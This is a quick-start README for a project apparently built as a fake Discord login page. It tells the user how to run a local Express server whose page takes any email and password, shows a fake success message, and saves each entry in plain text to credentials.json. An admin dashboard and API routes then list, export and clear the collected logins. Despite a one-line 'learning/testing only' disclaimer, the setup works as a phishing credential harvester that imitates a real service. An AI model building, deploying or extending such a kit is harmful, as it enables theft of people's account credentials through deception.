# Quick Start Guide - Discord Login with JSON Storage

## 🚀 3 Easy Steps to Get Started

### Step 1: Install Dependencies
Open terminal/command prompt in the project folder and run:
```bash
npm install
```

### Step 2: Start the Server
```bash
npm start
```

You should see:
```
[v0] Discord Login Server running at http://localhost:3000
[v0] Login data will be saved to: /credentials.json
```

### Step 3: Open in Browser
- **Login Page**: http://localhost:3000
- **Admin Dashboard**: http://localhost:3000/admin

## 📝 How to Use

### 1. Login Page (http://localhost:3000)
1. Enter any email/username in the first field
2. Enter a password in the second field
3. Click **"Log In"** button
4. You'll see a loading animation
5. After ~3 seconds, you'll get a success message
6. Data is now saved to `credentials.json` file

### 2. Admin Dashboard (http://localhost:3000/admin)
View all saved credentials in a beautiful dashboard with:
- Total login count
- Unique email count
- Last login time
- Full table of all entries
- Export as JSON
- Clear all records

## 📄 Where Are My Credentials Saved?

After the first login, a file called `credentials.json` will be created in your project folder:

```json
[
  {
    "email": "user@example.com",
    "password": "mypassword",
    "timestamp": "2024-01-22T10:30:00.000Z"
  }
]
```

Every login adds a new entry to this file.

## 🔗 API Routes You Can Use

If you want to integrate this with other apps:

**Save Login:**
```bash
curl -X POST http://localhost:3000/api/save-login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}'
```

**Get All Logins:**
```bash
curl http://localhost:3000/api/get-logins
```

**Clear All Records:**
```bash
curl -X DELETE http://localhost:3000/api/clear-logins
```

## ❓ Common Questions

**Q: Can I change the port?**
A: Yes! Edit `server.js` line 5 and change `3000` to any other port like `5000` or `8080`

**Q: Is this secure for real use?**
A: No, this is for learning/testing only. Never use plain text passwords in production!

**Q: Can I see the saved data while running?**
A: Yes! Just open `credentials.json` file in your text editor to see all saved logins

**Q: How do I stop the server?**
A: Press `Ctrl + C` in the terminal

**Q: Can I delete specific entries?**
A: Currently no - use the admin dashboard to clear all records, or edit `credentials.json` manually

## 🛠️ File Structure

```
├── index.html          ← Login page UI
├── admin.html          ← Admin dashboard to view records
├── js/script.js        ← Login page JavaScript
├── css/
│   ├── index.css       ← Base styles
│   └── main.css        ← Page styles
├── assets/             ← Images & fonts
├── server.js           ← Backend Express server
├── package.json        ← Node.js dependencies
└── credentials.json    ← Auto-generated (your saved data)
```

## 💡 Next Steps

- Try logging in with different emails
- Check the admin dashboard to see all records
- Export the data as JSON
- Modify the styles in `css/main.css`
- Add more fields (username, name, etc.)

Happy coding! 🎉
